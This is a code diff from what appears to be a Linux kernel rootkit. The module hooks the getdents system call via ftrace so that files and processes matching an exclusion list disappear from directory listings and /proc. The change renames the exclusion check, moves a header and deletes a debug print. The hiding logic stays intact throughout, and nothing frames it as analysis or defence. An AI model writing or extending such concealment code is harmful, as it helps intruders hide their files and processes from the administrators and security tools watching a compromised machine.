@@ -1,5 +1,5 @@
 
-#include "utils/string_utils.h"
+#include "utils/excludes/string_filtering.h"
 #include "utils/proc_utils.h"
 #include "utils/ftrace_utils.h"
 #include "hooks/x64_sys_getdents.h"
@@ -42,7 +42,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
         d = (struct linux_dirent64 *)((char *)kdirent + offset);
         size_t shift_by = 0;
 
-        if (is_excluded(d->d_name)) {
+        if (str_entry_is_excluded(d->d_name)) {
             shift_by = d->d_reclen; 
             goto shift_and_iter;
         } else if (is_numeric(d->d_name)) {
@@ -56,7 +56,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
                         if (cmdline[i] == '\0')
                             cmdline[i] = ' ';
                     }
-                    if (is_excluded(cmdline)) {
+                    if (str_entry_is_excluded(cmdline)) {
                         kfree(cmdline);
                         shift_by = d->d_reclen;
                         goto shift_and_iter;
@@ -74,7 +74,6 @@ shift_and_iter:
         } else {
             offset += d->d_reclen;
             bytes_left -= d->d_reclen;
-            pr_info("hello from %s\n", d->d_name);
         }
         continue;
     }
